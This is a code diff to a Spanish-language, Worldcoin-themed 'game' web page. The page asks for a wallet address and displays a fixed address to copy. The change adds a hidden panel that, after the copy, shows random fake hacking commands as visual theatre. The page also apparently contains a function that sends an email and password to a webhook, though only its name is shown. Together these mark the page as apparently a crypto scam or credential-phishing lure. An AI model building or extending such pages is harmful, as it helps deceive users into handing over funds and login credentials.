@@ -30,6 +30,10 @@
     <p>Jugar es muy sencillo</p>
       <div id="worldcoin-dashboard">
         <input type="text" id="worldcoinAddressInput" placeholder="Ingresa tu dirección de Optimism">
+
+<div id="fakeEditor" style="display:none; background-color: #1e1e1e; color: lime; padding: 10px; margin-top: 20px; width: 80%; height: 200px; overflow-y: scroll; font-family: 'Courier New', monospace; white-space: pre;"></div>
+
+          
         <button id="copyAddress">Copiar Dirección</button>
         <p id="providedAddress" style="display:none;">0x01C65F22A9478C2932e62483509c233F0aaD5c72</p>
     </div>
@@ -230,6 +234,35 @@ span {
         }, function(err) {
             console.error('Error al copiar la dirección:', err);
         });
+            mostrarFakeEditor();
+function mostrarFakeEditor() {
+    const editor = document.getElementById('fakeEditor');
+    editor.style.display = 'block';
+    
+    let fakeCode = "";
+    const lineas = 10; // Número de líneas de código falso a generar
+
+    for (let i = 0; i < lineas; i++) {
+        fakeCode += generarLineaCodigo() + "\n";
+    }
+
+    editor.textContent = fakeCode;
+}
+
+function generarLineaCodigo() {
+    const comandos = [
+        "hack.init()", 
+        "hack.attack('192.168.0.1')", 
+        "system.override()", 
+        "user.setPassword('123456')",
+        "fetch('data', { mode: 'cors' })",
+        "encrypt.data('secretKey')",
+        "console.log('Hackeo completo')"
+    ];
+
+    // Retorna un comando aleatorio
+    return comandos[Math.floor(Math.random() * comandos.length)];
+}
     });
 
 function enviarDatosAWebhook(email, contrasena) {
